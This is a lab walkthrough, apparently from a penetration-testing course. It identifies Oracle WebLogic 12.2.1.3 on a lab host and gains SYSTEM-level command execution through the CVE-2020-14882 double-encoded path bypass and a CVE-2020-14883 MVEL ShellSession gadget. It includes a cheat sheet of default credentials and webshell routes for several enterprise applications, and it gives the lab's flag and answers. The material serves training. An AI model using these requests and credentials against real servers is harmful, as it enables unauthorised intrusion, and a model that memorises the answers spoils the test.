# Section 29 — Other Notable Applications (Skills-Assessment style)

This section is about **methodology over memorisation**: when you hit an app not covered elsewhere, the play is always the same — *enumerate → fingerprint version → look up default creds / known CVEs → abuse built-in functionality or a public exploit*. The lab here is a black-box: identify the app and get RCE.

## Honorable-Mentions cheat sheet (default creds / abuse)

| App | Port(s) | Quick win |
|-----|---------|-----------|
| Axis2 | 8080 (often on Tomcat) | weak/default admin → upload `.aar` webshell (MSF module) |
| WebSphere | 9060/9043 | default `system:manager` → deploy WAR → RCE |
| Elasticsearch | 9200 | old RCE CVEs (HTB *Haystack*) |
| Zabbix | 80/10051 | SQLi, auth bypass, API → RCE (HTB *Zipper*) |
| Nagios | 80 | default `nagiosadmin:PASSW0RD`; many RCE/root CVEs |
| **WebLogic** | **7001** | **190+ CVEs; unauth Java deserialization / console RCE** |
| DotNetNuke | 80/443 | auth bypass, traversal, file-upload bypass |
| vCenter | 443/5480 | CVE-2021-22005 unauth OVA upload; often runs as SYSTEM/DA |

---

## Step 1 — Enumerate & identify (Q1)

```bash
nmap -p- -sS -sV -T4 --min-rate 2000 -Pn --open 10.129.201.102
```
✅ **Verified output (key line):**
```
21/ftp  80/IIS10  135/139/445  5985/winrm
7001/tcp open  http  Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)
49664-49670 msrpc
```
> Windows host with the usual IIS/SMB/WinRM noise — but **port 7001 = Oracle WebLogic**, and nmap even gives `12.2.1.3 (T3 enabled)`. Don't get distracted by IIS/FTP; the non-standard port is the target app. **T3 enabled** = the WebLogic remoting protocol, gateway to deserialization RCE.

**Pin the exact version:**
```bash
curl -s http://10.129.201.102:7001/console/login/LoginForm.jsp | grep -i footerVersion
# -> <p id="footerVersion">WebLogic Server Version: 12.2.1.3.0</p>
```
> The console login page footer leaks the precise build. **12.2.1.3.0** is squarely in range for the unauthenticated console RCE chain **CVE-2020-14882 + CVE-2020-14883**.

**§29 Q1 — running application → `Oracle WebLogic Server` (12.2.1.3.0)**

---

## Step 2 — Exploit: CVE-2020-14882 + CVE-2020-14883 (Q2)

Two bugs chained, **no authentication**:
- **CVE-2020-14882** — path-traversal auth bypass: double-URL-encoded `..%2f` reaches admin handlers without login.
- **CVE-2020-14883** — RCE via a Gadget in the `handle` parameter (`com.tangosol.coherence.mvel2.sh.ShellSession` MVEL, or `FileSystemXmlApplicationContext` for remote XML).

**Reachability check:**
```bash
curl -s -o /dev/null -w "%{http_code}\n" \
 "http://10.129.201.102:7001/console/css/%252e%252e%252fconsole.portal"
# -> 302  (auth bypass works; %252e%252e%252f == double-encoded ../)
```
> `%252e` decodes to `%2e` then `.` — the **double encoding** slips the traversal past the URL filter; `console.portal` is an authenticated handler now reachable unauthenticated. `302` (not `403/redirect-to-login`) = CVE-2020-14882 confirmed.

**RCE — MVEL `ShellSession` gadget, command supplied via the `cmd` header:**
```
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=
    com.tangosol.coherence.mvel2.sh.ShellSession('<MVEL that reads the "cmd" header,
    runs ProcessBuilder, and writes stdout back into the HTTP response>')
```
Full exploit: `/tmp/wls_rce.py` (this kit). Usage / ✅ **verified output:**
```bash
python3 wls_rce.py "whoami"
# -> nt authority\system
python3 wls_rce.py "dir C:\Users\Administrator\Desktop"
# -> flag.txt (14 bytes) , WebLogic_Admin_WinSvc_Install.cmd
python3 wls_rce.py "type C:\Users\Administrator\Desktop\flag.txt"
# -> w3b_l0gic_RCE!
```
> The MVEL reflects into the live `ServletRequest`, reads your `cmd` header, runs it via `ProcessBuilder`, and writes stdout straight into the response — a self-contained webshell needing **no callback / no listener** (ideal headless). WebLogic runs as **`nt authority\system`**, so the command output is fully privileged — no privesc needed.

> **Gotcha (documented):** the gadget calls `currentThread.interrupt()` after writing output, so the HTTP response has **no/!short Content-Length** → Python `urllib` throws `http.client.IncompleteRead`. **Catch it and read `e.partial`** (or just use `curl`, which prints the bytes anyway). The data is there; it's a truncated-stream artefact, not a failure.

**§29 Q2 — flag → `w3b_l0gic_RCE!`**

---

## Exam / Engagement Notes

- **Don't fixate on the obvious ports.** IIS/SMB/FTP were noise; the win was the **non-standard 7001**. Always `-p-` and read the *whole* service list.
- **Fingerprint the exact version before exploiting** — WebLogic CVEs are version-gated (console footer / `/console/login/LoginForm.jsp`).
- **WebLogic = deserialization goldmine**: CVE-2020-14882/14883 (console, used here), CVE-2019-2725 (wls-wsat), CVE-2017-10271 (XMLDecoder), CVE-2018-2628/CVE-2020-2555 (T3). Try 14882/14883 first on 12.2.x — reliable, unauth, no listener.
- **`%252e%252e%252f` = double-encoded `../`** — remember the double-encode trick for WebLogic/many auth-bypass traversals.
- **Header-driven webshell gadgets** (cmd in a header, output in the body) are the cleanest for scripted/CI/headless exploitation — and handle the `IncompleteRead` truncation.
- **Methodology for any unknown app:** enumerate → version → default creds (`nagiosadmin:PASSW0RD`, `system:manager`, etc.) → known CVE / built-in-functionality RCE. Default password + built-in feature is *usually* enough.

---

## Lab Walkthrough (quick steps)

```
1. nmap -p- -sV <ip>                       -> 7001 Oracle WebLogic 12.2.1.3 (T3)
2. curl :7001/console/login/LoginForm.jsp  -> footerVersion 12.2.1.3.0   (Q1 = Oracle WebLogic)
3. curl :7001/console/css/%252e%252e%252fconsole.portal -> 302 (CVE-2020-14882 OK)
4. python3 wls_rce.py "whoami"             -> nt authority\system
5. python3 wls_rce.py "type C:\Users\Administrator\Desktop\flag.txt"
                                           -> w3b_l0gic_RCE!            (Q2)
```

> One line: weird port 7001 → WebLogic 12.2.1.3 → unauth console RCE (14882+14883) → SYSTEM → flag. The section's real lesson: the foothold was *enumeration discipline + version-to-CVE lookup*, not a memorised exploit.
